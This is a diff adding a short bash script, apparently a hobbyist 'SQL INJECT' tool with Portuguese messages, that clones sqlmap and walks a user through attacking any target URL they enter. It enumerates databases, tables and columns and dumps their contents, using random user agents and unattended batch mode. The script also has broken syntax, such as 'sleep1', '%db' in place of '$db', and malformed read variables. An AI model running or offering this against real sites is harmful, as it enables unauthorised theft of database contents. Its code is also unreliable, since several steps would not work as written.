@@ -1,0 +1,18 @@
+#!/bin/bash
+#Tool Created By Andr4x
+#OffensiveEncode Org
+echo "Processo de Instalacao Iniciando.."
+git clone  https://github.com/sqlmapproject/sqlmap
+cd sqlmap
+figlet "SQL INJECT"
+read -p "Target:" target
+sleep1
+echo "Testing SQL INJECTION ATTACK.."
+python2 sqlmap.py -u $target --dbs --random-agent --batch
+read -p "DataBase:" db
+python2 sqlmap.py -u $target -D %db --random-agent --batch --tables
+read -p "Table:" $tb
+python2 sqlmap.py -u $target -D $db -T %tb --random-agent --batch --columns
+read -p "Column:" $cm
+python2 sqlmap.py -u $target -D %db -T %tb -C %cm --dump --random-agent --batch
+echo "se quiser pegar outra informacao faça o mesmo processo :p"
